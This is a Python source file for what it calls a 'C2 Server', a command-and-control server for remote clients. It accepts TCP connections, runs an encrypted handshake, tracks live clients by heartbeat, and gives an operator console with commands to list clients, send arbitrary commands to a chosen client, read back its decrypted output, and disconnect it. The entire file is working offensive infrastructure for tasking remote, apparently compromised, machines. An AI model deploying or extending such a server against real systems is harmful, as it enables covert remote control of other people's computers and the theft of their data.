import threading
import logging
import argparse
import socket
import itertools
import time
from concurrent.futures import ThreadPoolExecutor
from server.crypto import Security
from server.logger import DBLogger
from network.tcp import Tcp

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("logfile.log"),
        DBLogger()
    ]
)

class Server:
    def __init__(self, ip, port):
        # public members
        self.is_running = True
        self.ip = ip
        self.port = port
        
        # private members
        self.__commands = { "help" : (self.help, "Displays a help message, usage: help", 0),
                            "exit" : (self.exit, "Exits the server, usage: exit", 0),
                            "clients" : (self.clients, "Displays active clients, usage: clients", 0),
                            "send" : (self.send, "Sends a command to a client, usage: send <client_id> <command>", 2),
                            "kill" : (self.kill, "Kills a client, usage: kill <client_id>", 1),
                            "info" : (self.info, "Displays information about the server, usage: info", 0)}

        self.__active_clients = {} # { client_id : (conn, client_address)}
        self.__act_client_lock = threading.Lock()
        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__server_socket.bind((self.ip, self.port))
        self.__server_socket.listen()
        self.__server_socket.settimeout(1.0) 
        self.__client_id_counter = itertools.count(1)
        self.__pool = ThreadPoolExecutor(max_workers=10)
        self.__security = Security()
        self.__listener_thread = threading.Thread(target=self.listen)
        self.__heartbeat_thread = threading.Thread(target=self.heartbeat)
        self.__listener_thread.start()
        self.__heartbeat_thread.start()
        
    def listen(self):
        while self.is_running:
            try:
                conn, addr = self.__server_socket.accept()
                conn.settimeout(None)
                logging.info(f"New connection accepted in address {addr[0]}:{addr[1]}")
                next_id = next(self.__client_id_counter)
                with self.__act_client_lock:
                    self.__active_clients[str(next_id)] = (conn, addr)
                try:
                    self.__security.handshake(str(next_id), conn)
                except Exception as e:
                    logging.warning(f"Error occurred during handshake with client {next_id}: {e}")  
                    self.kill(str(next_id))
            except socket.timeout:
                continue
        
    def heartbeat(self):
        while self.is_running:
            time.sleep(1)
            with self.__act_client_lock:
                client_ids = list(self.__active_clients.keys())
                for cid in client_ids:
                    try:
                        conn = self.__active_clients[cid][0]
                        Tcp.send_heartbeat(conn)
                    except:
                        logging.info(f"Client {cid} is not here, cleaning")
                        self.__active_clients.pop(cid, None)
                        conn.close()

    def run(self):
        while self.is_running:
            raw_cmd = input("cli> ")
            if raw_cmd:
                tokens = raw_cmd.strip().split(maxsplit=2)
                cmd, args = tokens[0], tokens[1:]
                if cmd in self.__commands and len(args) == self.__commands[cmd][2]:
                    fun = self.__commands[cmd][0]
                    fun(*args)
                else:
                    print(f"Invalid command or incorrect number of arguments. Type 'help' for a list of commands.")
                    logging.warning(f"Invalid command or incorrect number of arguments. Type 'help' for a list of commands.")
                    
    def shutdown(self):
        self.__listener_thread.join()
        self.__heartbeat_thread.join()
        self.__pool.shutdown(True)
        self.__server_socket.close()
                    
    def help(self):
        for cmd, (_, desc, _) in self.__commands.items():
            print(f"{cmd}: {desc}")

    def exit(self):
        self.is_running = False
        logging.info("Exiting server...")
        for cid in list(self.__active_clients.keys()):
            self.kill(cid)
        
    def clients(self):
        with self.__act_client_lock:
            if not self.__active_clients:
                print("No active clients.")
            else:
                for cid, (conn, addr) in self.__active_clients.items():
                    print(f"Client ID: {cid}, Address: {addr[0]}:{addr[1]}")
        
    def send(self, client_id, command):
        def process(self, cid, conn, command):
            try:
                logging.info(f"Sending command to client {client_id}: {command}")
                ciphertext = self.__security.encrypt(cid, command)
                Tcp.send(conn, ciphertext)
                data = Tcp.recive(conn)
                if data:
                    plaintext = self.__security.decrypt(cid, data)
                    logging.info(f"Received data from client {cid}: {plaintext}")
            except (BrokenPipeError, ConnectionResetError) as e:
                logging.warning(f"Error in connection occurred while processing client {cid}: {e}, killing client")
                self.kill(cid)
            except Exception as e:
                logging.warning(f"Error occurred while processing client {cid}: {e}")
                
        with self.__act_client_lock:
            if client_id in self.__active_clients:
                conn = self.__active_clients[client_id][0]
                self.__pool.submit(process, self, client_id, conn, command)
            else:
                print("Non existing client")
                logging.warning(f"Non existing client: {client_id} cannot send command: {command}")
        
    def kill(self, client_id):
        with self.__act_client_lock:
            if client_id in self.__active_clients:
                conn, addr = self.__active_clients.pop(client_id)
                conn.close()
                self.__security.remove_client(client_id)
                logging.info(f"Killed client {client_id} at address {addr[0]}:{addr[1]}")
            else:
                print(f"No client with ID {client_id} found.")
                logging.warning(f"No client with ID {client_id} found.")
    
    def info(self):
        print(f"Server Info:")
        print(f"  IP: {self.ip}")
        print(f"  Port: {self.port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="C2 Server")
    parser.add_argument("--ip", type=str, default="127.0.0.1", help="IP address to bind the server")
    parser.add_argument("--port", type=int, default=12345, help="Port number to bind the server")
    args = parser.parse_args()
    server = Server(args.ip, args.port)
    server.run()
    server.shutdown()